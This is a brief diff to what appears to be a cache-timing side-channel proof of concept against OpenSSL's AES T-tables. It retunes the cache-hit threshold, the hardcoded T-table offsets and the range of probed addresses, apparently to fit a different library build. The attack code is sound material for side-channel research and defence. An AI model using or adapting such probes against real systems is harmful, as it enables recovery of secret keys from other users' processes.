@@ -11,7 +11,7 @@
 #include <vector>
 
 // this number varies on different systems
-#define MIN_CACHE_HIT_CYCLES (150)
+#define MIN_CACHE_HIT_CYCLES (140)
 
 // more encryptions show features more clearly
 #define NUMBER_OF_ENCRYPTIONS (1000*10)
@@ -74,12 +74,13 @@ int main()
     AES_encrypt(plaintext, ciphertext, &key_struct);
 
     // adjust me (decreasing order)
-    int te0 = 0x16cc80;
-    int te1 = 0x16cbc0;
-    int te2 = 0x16cac0;
-    int te3 = 0x16c9c0;
+    int te0 = 0x186f60;
+    int te1 = 0x186b60;
+    int te2 = 0x186760;
+    int te3 = 0x186360;
 
-    for (probe = base + te3 - 0x80; probe < base + te0 + 0xc0; probe += 64) // hardcoded addresses (could be done dynamically)
+    //adjust address range to exclude unwanted lines/tables
+    for (probe = base + te3; probe < base + te0 + 64*16; probe += 64) // hardcoded addresses (could be done dynamically)
     {
       size_t count = 0;
       for (size_t i = 0; i < NUMBER_OF_ENCRYPTIONS; ++i)
